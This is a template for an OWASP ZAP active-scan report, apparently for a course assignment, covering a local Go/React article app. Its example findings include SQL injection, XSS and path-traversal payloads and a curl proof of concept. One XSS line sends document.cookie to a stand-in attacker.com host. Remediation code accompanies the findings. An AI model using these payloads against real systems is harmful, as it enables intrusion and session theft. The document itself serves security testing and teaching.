# OWASP ZAP Active Scan Analysis

## Scan Information

- **Scan Date:** [To be filled after running scan]
- **Target URL:** http://localhost:4100
- **Backend API:** http://localhost:8080/api
- **Scan Type:** Active (Authenticated)
- **Scan Duration:** [duration]
- **Scan Policy:** OWASP Top 10
- **Authentication:** JWT Token
- **Test User:** security-test@example.com

## Executive Summary

The active scan actively probes the application for vulnerabilities by sending specially crafted requests. This scan was performed with authentication to test protected functionality.

**Overall Risk Assessment:** [To be determined after scan]

## Vulnerability Summary

### By Risk Level

| Risk Level | Count | Percentage |
|------------|-------|------------|
| Critical | [count] | [%] |
| High | [count] | [%] |
| Medium | [count] | [%] |
| Low | [count] | [%] |
| Informational | [count] | [%] |
| **Total** | **[count]** | **100%** |

### OWASP Top 10 Mapping

| OWASP Category | Vulnerabilities Found |
|----------------|----------------------|
| A1: Injection | [count] |
| A2: Broken Authentication | [count] |
| A3: Sensitive Data Exposure | [count] |
| A4: XML External Entities (XXE) | [count] |
| A5: Broken Access Control | [count] |
| A6: Security Misconfiguration | [count] |
| A7: Cross-Site Scripting (XSS) | [count] |
| A8: Insecure Deserialization | [count] |
| A9: Using Components with Known Vulnerabilities | [count] |
| A10: Insufficient Logging & Monitoring | [count] |

## Critical/High Severity Vulnerabilities

*Note: Fill in this section based on actual scan results*

---

### Example Finding Template:

### [Vulnerability #1]: SQL Injection

**Risk:** Critical  
**Confidence:** High  
**CWE:** CWE-89  
**OWASP:** A1:2017-Injection

**Affected URLs:**
- `http://localhost:8080/api/articles?tag=[injection point]`
- `http://localhost:8080/api/articles?author=[injection point]`

**Description:**  
SQL injection vulnerability detected in the articles search functionality. User input is not properly sanitized before being used in SQL queries.

**Attack Details:**

**Original Request:**
```http
GET /api/articles?tag=test HTTP/1.1
Host: localhost:8080
Authorization: Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Attack Request:**
```http
GET /api/articles?tag=test' OR '1'='1 HTTP/1.1
Host: localhost:8080
Authorization: Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Response Evidence:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "articles": [
    // All articles returned, bypassing filter
  ]
}
```

**Proof of Concept:**
```bash
curl "http://localhost:8080/api/articles?tag=test'+OR+'1'='1" \
  -H "Authorization: Token <token>"
```

**Impact:**  
- **Critical** - An attacker could:
  - Extract sensitive data from the database
  - Modify or delete database records
  - Potentially gain control of the database server
  - Bypass authentication and authorization

**Exploit Scenario:**
1. Attacker crafts malicious SQL in the `tag` parameter
2. Server executes the malicious SQL
3. Attacker retrieves sensitive data or modifies records

**Remediation:**  
1. **Use Parameterized Queries:**
```go
// BAD - Vulnerable to SQL injection
query := "SELECT * FROM articles WHERE tag = '" + userInput + "'"

// GOOD - Using parameterized query
query := "SELECT * FROM articles WHERE tag = ?"
db.Query(query, userInput)
```

2. **Input Validation:**
   - Validate and sanitize all user input
   - Use whitelist validation where possible
   - Reject special characters in tag names

3. **Use ORM:**
   - Consider using GORM or similar ORM with built-in protection

**Verification:**
- Re-test after implementing parameterized queries
- Verify input validation is in place
- Run SQL injection tests again

**References:**
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

---

### [Vulnerability #2]: Cross-Site Scripting (XSS) - Stored

**Risk:** High  
**Confidence:** High  
**CWE:** CWE-79  
**OWASP:** A7:2017-Cross-Site Scripting

**Affected URLs:**
- `http://localhost:4100/article/[slug]`
- `http://localhost:8080/api/articles` (POST)

**Description:**  
Stored XSS vulnerability in article content. User-supplied HTML in article body is not properly sanitized before being rendered.

**Attack Details:**

**Attack Request:**
```http
POST /api/articles HTTP/1.1
Host: localhost:8080
Authorization: Token <token>
Content-Type: application/json

{
  "article": {
    "title": "Test Article",
    "description": "Description",
    "body": "<script>alert('XSS')</script>",
    "tagList": ["test"]
  }
}
```

**Evidence:**
When viewing the article, the JavaScript executes in victim's browser.

**Proof of Concept:**
```javascript
// Article body contains:
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**Impact:**  
- **High** - An attacker could:
  - Steal authentication tokens/cookies
  - Perform actions on behalf of victims
  - Deface the website
  - Redirect users to malicious sites
  - Install keyloggers

**Exploit Scenario:**
1. Attacker creates article with malicious JavaScript
2. Victim views the article
3. JavaScript executes in victim's browser
4. Attacker steals session token or performs unauthorized actions

**Remediation:**

**Backend (Go):**
```go
import "html"

// Sanitize user input
sanitizedBody := html.EscapeString(article.Body)
```

**Frontend (React):**
```javascript
// React automatically escapes content, but if using dangerouslySetInnerHTML:
import DOMPurify from 'dompurify';

const sanitizedHTML = DOMPurify.sanitize(articleBody);
<div dangerouslySetInnerHTML={{__html: sanitizedHTML}} />
```

**Additional Measures:**
1. Implement Content Security Policy (CSP)
2. Use HTTP-only cookies
3. Validate input on both client and server
4. Use a markdown parser instead of accepting raw HTML

**Verification:**
- Test with various XSS payloads
- Verify content is escaped in HTML
- Check CSP headers are set

---

### [Vulnerability #3]: Broken Access Control - IDOR

**Risk:** High  
**Confidence:** High  
**CWE:** CWE-639  
**OWASP:** A5:2017-Broken Access Control

**Affected URLs:**
- `DELETE /api/articles/:slug`
- `PUT /api/articles/:slug`

**Description:**  
Users can modify or delete articles belonging to other users. The API doesn't properly verify article ownership.

**Attack Details:**

**Scenario:**
1. User A creates article with slug "user-a-article"
2. User B (attacker) obtains their own valid JWT
3. User B sends DELETE request for User A's article

**Attack Request:**
```http
DELETE /api/articles/user-a-article HTTP/1.1
Host: localhost:8080
Authorization: Token <user_b_token>
```

**Response:**
```http
HTTP/1.1 200 OK

{
  "message": "Article deleted successfully"
}
```

**Impact:**  
- **High** - Attackers can:
  - Delete other users' articles
  - Modify other users' content
  - Impersonate other users

**Remediation:**

```go
// Add ownership check before allowing modification/deletion
func DeleteArticle(c *gin.Context) {
    slug := c.Param("slug")
    currentUser := GetCurrentUser(c)
    
    article := GetArticleBySlug(slug)
    if article.AuthorID != currentUser.ID {
        c.JSON(403, gin.H{"error": "Forbidden"})
        return
    }
    
    // Proceed with deletion
    DeleteArticleRecord(article)
    c.JSON(200, gin.H{"message": "Deleted"})
}
```

**Verification:**
- Test with different users
- Verify authorization checks are in place
- Test all endpoints that modify resources

---

## Medium Severity Vulnerabilities

### [Finding Template for Medium Issues]

**Risk:** Medium  
**Confidence:** [High/Medium/Low]  
**CWE:** [number]  
**Description:** [description]  
**Remediation:** [solution]

---

## API Security Issues

### Rate Limiting

**Status:** [Present/Not Present]

**Test Results:**
```bash
# Sent 100 requests in 10 seconds
# Result: [All succeeded / Rate limit triggered at X requests]
```

**Recommendation:**  
Implement rate limiting on all API endpoints:
```go
// Use rate limiting middleware
import "golang.org/x/time/rate"

limiter := rate.NewLimiter(10, 100) // 10 requests per second, burst of 100
```

---

### Verbose Error Messages

**Risk:** Low  
**Evidence:**
```json
{
  "error": "sql: no rows in result set"
}
```

**Recommendation:**  
Return generic error messages in production:
```json
{
  "error": "Resource not found"
}
```

---

## Authentication & Authorization Testing

### JWT Token Security

**Tests Performed:**
- [✓] Token validation on protected endpoints
- [✓] Expired token rejection  
- [✓] Invalid token rejection
- [✓] Token manipulation detection
- [✓] No token provided handling

**Findings:**
[Document any issues found]

---

### Authorization Testing

**Tests Performed:**
1. Access other users' resources
2. Modify other users' data
3. Delete other users' content
4. Privilege escalation attempts

**Results:**
[Document findings]

---

## Input Validation Testing

### Tested Inputs

| Input Type | Endpoint | Test Payloads | Result |
|------------|----------|---------------|--------|
| SQL Injection | /api/articles | `' OR '1'='1` | [Pass/Fail] |
| XSS | /api/articles | `<script>alert(1)</script>` | [Pass/Fail] |
| Command Injection | /api/user | `; ls -la` | [Pass/Fail] |
| Path Traversal | /api/articles | `../../etc/passwd` | [Pass/Fail] |
| XXE | XML endpoints | XXE payload | [Pass/Fail] |

---

## Security Headers (from Active Scan)

Same findings as passive scan plus any additional issues discovered during active testing.

---

## Session Management

**Findings:**
- [Token expiration handling]
- [Session fixation testing]
- [Concurrent session handling]

---

## Business Logic Testing

### Test Cases:

1. **Favorite Own Article:**
   - Can users favorite their own articles?
   - Result: [Yes/No]
   - Risk: [None/Low]

2. **Multiple Favorites:**
   - Can users favorite the same article multiple times?
   - Result: [Yes/No]
   - Risk: [Could inflate favorite count]

3. **Follow Self:**
   - Can users follow themselves?
   - Result: [Yes/No]
   - Risk: [Low - Logic issue]

---

## Comparison with SAST Results

| Vulnerability Type | Active Scan | Snyk | SonarQube |
|--------------------|-------------|------|-----------|
| SQL Injection | [count] | 0 | [TBD] |
| XSS | [count] | 0 | [TBD] |
| IDOR | [count] | N/A | [TBD] |
| Auth Issues | [count] | N/A | [TBD] |

**Analysis:**  
DAST (ZAP) finds runtime vulnerabilities that SAST tools may miss, such as:
- Configuration issues
- Access control problems
- Runtime injection vulnerabilities

---

## Risk Assessment

**Critical Issues:** [count]  
**High Issues:** [count]  
**Overall Risk:** [Critical/High/Medium/Low]

**Most Serious Findings:**
1. [Finding 1]
2. [Finding 2]
3. [Finding 3]

---

## Recommendations

### Immediate Actions (Critical/High)
1. [Action 1]
2. [Action 2]
3. [Action 3]

### Short Term (Medium)
1. [Action 1]
2. [Action 2]

### Long Term (Low/Info)
1. [Action 1]
2. [Action 2]

---

## Scan Statistics

- **Total Requests Sent:** [count]
- **Scan Duration:** [time]
- **URLs Tested:** [count]
- **Parameters Tested:** [count]
- **Authenticated Pages:** [count]

---

## Evidence Files

- **HTML Report:** `zap-active-report.html`
- **XML Report:** `zap-active-report.xml`
- **JSON Report:** `zap-active-report.json`
- **Screenshots:** See `assignment_2/screenshots/zap-active-*.png`

---

## Conclusion

[Provide summary of active scan findings]

**Security Posture:** [Assessment]

**Key Findings:**
1. [Finding 1]
2. [Finding 2]
3. [Finding 3]

**Next Steps:**
1. Fix critical and high severity issues
2. Implement security headers
3. Re-run scan to verify fixes
4. Consider penetration testing

---

**Scanned by:** OWASP ZAP  
**Scan Type:** Active (Authenticated)  
**Date:** [Date]  
**Analyst:** [Your name]

## Required Screenshots

- [ ] `zap-active-scan-progress.png`
- [ ] `zap-active-scan-alerts.png`
- [ ] `zap-active-high-risk-detail.png`
- [ ] `zap-active-authenticated-pages.png`
- [ ] `zap-active-sql-injection.png` (if found)
- [ ] `zap-active-xss.png` (if found)
